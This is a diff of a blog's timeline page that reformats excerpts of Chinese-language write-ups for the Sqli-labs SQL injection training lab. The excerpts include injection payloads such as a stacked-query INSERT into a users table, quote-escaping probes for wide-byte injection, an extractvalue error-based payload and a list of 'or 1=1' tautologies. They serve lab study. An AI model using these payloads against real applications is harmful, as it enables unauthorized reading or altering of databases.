-1?id=1;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+
-Less-...
+?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+Less-42本关通过P...
                                         </p>
                                     </div>
                                 </li>
@@ -1217,10 +1296,10 @@ Less-...
                                             前一部分链接：第21-30关Write-up
 Less-31Less-32本关开始，考查的是宽字节注入的利用，关于宽字节注入的知识点可以看我的文章Sqli-labs Tips的Tip 4 
 我们提交以下payload时，发现单引号&#39;被转义了
-1?id=1&apos;
+?id=1&#39;
 
 查看源码，发现使用了check_addslashes()函数对id进行了处理
-1$id=check_addslash...
+$id=check_addslashes(...
                                         </p>
                                     </div>
                                 </li>
@@ -1252,7 +1331,7 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
 Less-22与前面关卡类似，只是对$cookee包括采用了双引号
 
 Base64加密一下payload：
-1234&quot; and extractvalue(1,...
+&quot; and extractvalue(1,conc...
                                         </p>
                                     </div>
                                 </li>
@@ -1269,7 +1348,9 @@ Base64加密一下payload：
                                             前一部分链接：第1-10关Write-up
 前言之前其他资料学习过程中，学会一个挺好用的学习技巧
 在源码中$sql变量下方加入以下内容
-123echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;echo $sql;e...
+echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;
+echo $sql;
+ec...
                                         </p>
                                     </div>
                                 </li>
@@ -1300,9 +1381,20 @@ Base64加密一下payload：
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/01/28/Sqli-labs Tips/">Sqli-labs Tips</a>
                                         <p>
                                             Tip 1 —— 基础知识点（1）简单的用于尝试的语句
-123456789or 1=1--+&apos;or 1=1--+&quot;or 1=1--+)or 1=1--+&apos;)or 1=1--+&quot;) or 1=1--+&quot;))or 1=1--+ps:--+和#可以互相替换
+or 1=1--+
+&#39;or 1=1--+
+&quot;or 1=1--+
+)or 1=1--+
+&#39;)or 1=1--+
+&quot;) or 1=1--+
+&quot;))or 1=1--+
+
+ps:--+和#可以互相替换
 （2）mysql命令行的简单命令
-1234567891011查看所有的数据库show dat...
+查看所有的数据库
+show databases;
+
+使用某个数据...
                                         </p>
                                     </div>
                                 </li>
